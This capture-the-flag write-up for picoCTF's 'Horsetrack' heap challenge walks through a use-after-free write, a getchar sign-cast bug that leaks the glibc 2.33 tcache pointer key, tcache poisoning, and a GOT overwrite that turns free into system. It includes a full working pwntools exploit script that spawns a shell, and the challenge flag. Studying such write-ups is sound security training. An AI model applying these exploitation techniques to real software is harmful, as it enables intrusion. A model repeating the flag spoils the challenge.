# Horsetrack

## Challenge

We are provided with a `vuln` binary, along with the libc and linker used by the challenge server.
The libc version is `GNU C Library (Debian GLIBC 2.33-1) release release version 2.33.`

The program prompts us with the following options:

```
1. Add horse
2. Remove horse
3. Race
4. Exit
```

We can create a horse, which will prompt us to enter:

- a stable index (0-17)
- the horse name length (16-256)
- the horse name

We can also remove a horse from a given stable index.

With at least 5 horses, we can race them.
This will print a series of frames depicting the race.
The first 16 characters of each horse's name is shown advancing towards a finish line.
The name of the winning horse is printed at the end.

### Checksec

```
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
    RUNPATH:  b'./'
```

## Solution

### Recovering switch statement

Looking at the decompilation of `main`, a lot seems to be missing.

We are missing the logic which handles our choice from the main menu.
In its place, we see the following warnings:

```
/* WARNING: Could not find normalized switch variable to match jumptable */
/* WARNING: This code block may not be properly labeled as switch case */
```

Looking at the disassembly of `main`, we can see there is a `jmp rax` instruction, followed by memory that was not disassembled.
Forcing Ghidra to disassemble and decompile this memory, we can recover the switch statement.

### Hidden option

Looking at the recovered switch statement, we can see there is a hidden option 0.

This allows us to give a horse a head start, setting its starting position to a given value.
It also requires us to change the horse's name to a new name of length 16.

However, it also sets a global variable.
If we attempt to race with with this variable set, we will be caught for cheating and the program will exit.

### Use-after-free write

Adding a horse allocates a heap buffer for its name and sets an in-use variable.

The remove option does not clear the pointer to the horse name, but it does clear the in-use variable.

Unlike other parts of the program, the head start option does not check that the stable is in use.
This allows us to write 16 bytes to the stale pointer.

We can use this UAF write to poison the tcache free list by overwriting the forward pointer.

However, as we are using libc version 2.33, the pointers are obfuscated by being XOR'd with the chunk address, right shifted by 12 bits.
To poison the tcache free list for an arbitrary write, we need to leak this XOR key.

### XOR key leak

Unfortunately, the UAF lets us write, but not read from the stale pointer.
We will need a second bug to achieve a leak.

When allocating a new chunk for a horse name, the chunk is not cleared.
Thus, the free list pointers are still present before we set the horse name.

Normally, we are forced to overwrite the free list pointers, as the minimum horse name length is 16 and a null byte will be appended.
However, looking at the function to set the horse name, we can see it is misusing `getchar`.

From the getchar(3) manual page:

```
RETURN VALUE
       fgetc(), getc(), and getchar() return the character read as an unsigned
       char cast to an int or EOF on end of file or error.
```

The function will break early if `getchar` returns an EOF.
This should mean that the stdin stream is closed, which would prevent us from continuing with the rest of the exploit.
However, the function makes the mistake of casting the return value to a `char` before checking for the EOF.
Thus, we can also cause the function to break early by sending a `\xff` character.

By sending a `\xff` character as the first character, we will not write anything into the horse name buffer.
When we read the name, we will see the free list pointers.
For the first chunk of a list, the original pointer will be NULL, thus, the value we leak is the XOR key itself.

We can cause the program to print these values by starting a race, which will print the first 16 characters of each horse's name in the race display.

Note that we cannot distinguish between a null byte in the middle of a key and a short key.
Some processing is required to distinguish between the start or end of a key and a `\x20` byte in the key, as it is padded by spaces on both sides.
However, these cases are rare enough that we can just try again if either of these occur.

We are also assuming that the chunk we are poisoning has the same key as the chunk we leaked from.
This should be true as long as they are on the same page, which is easy enough to control.

### Arbitrary write

Now that we have a UAF write and an XOR key leak, we can poison the free list and achieve a near-arbitrary allocation.
The allocation still has to be aligned to 16 bytes, but this isn't a huge concern given that we can control the size of the allocation and the amount we write.

To achieve the corrupt allocation, we use the head start option to modify a forward pointer of a freed chunk with the target address, XOR'd with the leaked key.
We then allocate from the chunk, which will set the next tcache chunk to use our forged forward pointer.
Lastly, we allocate one more chunk from the tcache, which will be placed at our target address.

### GOT overwrite to shell

There is no RELRO protection on the binary, so we can overwrite GOT entries to change the behaviour of the program.
As we have a PLT entry for `system`, we can replace the `free` GOT entry with this function.
Thus, when the program attempts to `free` a horse name, it will pass the pointer to `system`.
We can set a horse name to a command we want to execute, such as `/bin/sh`, then remove it to spawn a shell.

## Exploit

```py
#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template --host saturn.picoctf.net --port 55127 vuln
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF('vuln')

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR
# ./exploit.py GDB HOST=example.com PORT=4141
host = args.HOST or 'saturn.picoctf.net'
port = int(args.PORT or 55127)

def start_local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def start_remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return start_local(argv, *a, **kw)
    else:
        return start_remote(argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
tbreak *0x00401c0c
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     amd64-64-little
# RELRO:    Partial RELRO
# Stack:    Canary found
# NX:       NX enabled
# PIE:      No PIE (0x400000)
# RUNPATH:  b'./'

def head_start(index, string, spot):
    io.sendlineafter(b"Choice: ", b"0")
    io.sendlineafter(b"Stable index # (0-17)? ", str(index).encode())
    io.sendlineafter(b"Enter a string of 16 characters: ", string)
    io.sendlineafter(b"New spot? ", str(spot).encode())

def add_horse(index, length, name):
    io.sendlineafter(b"Choice: ", b"1")
    io.sendlineafter(b"Stable index # (0-17)? ", str(index).encode())
    io.sendlineafter(b"Horse name length (16-256)? ", str(length).encode())
    io.sendlineafter(b"characters: ", name)

def remove_horse(index):
    io.sendlineafter(b"Choice: ", b"2")
    io.sendlineafter(b"Stable index # (0-17)? ", str(index).encode())

def race():
    io.sendlineafter(b"Choice: ", b"3")

io = start()

for i in range(0x8):
    add_horse(i, 0x17, b'a' * 0x17)

for i in range(0x8)[::-1]:
    remove_horse(i)

for i in range(0x6):
    add_horse(i, 0x17, b'\xff')

add_horse(0x6, 0x17, b'a' * 8 + b'\xff')
add_horse(0x7, 0x17, b'\xff')

race()

io.recvuntil(b'a' * 8)
io.recvuntil(b'\n')
xor_leak = unpack(io.recvuntil(b'|', drop=True).strip(), 'all')

info(f'leak: {xor_leak:04x}')

remove_horse(0)
remove_horse(1)

fake = exe.got['free'] & 0xfffffffffffffff0
head_start(0x1, pack(fake ^ xor_leak) + b'\xff', 0)

add_horse(1, 0x17, b'/bin/sh\x00\xff')

add_horse(0, 0x17, flat({0x8: pack(exe.plt['system'])}) + b'\xff')

remove_horse(1)

io.interactive()
```

## Flag

```
picoCTF{t_cache_4ll_th3_w4y_2_th4_b4nk_27988d2c}
```
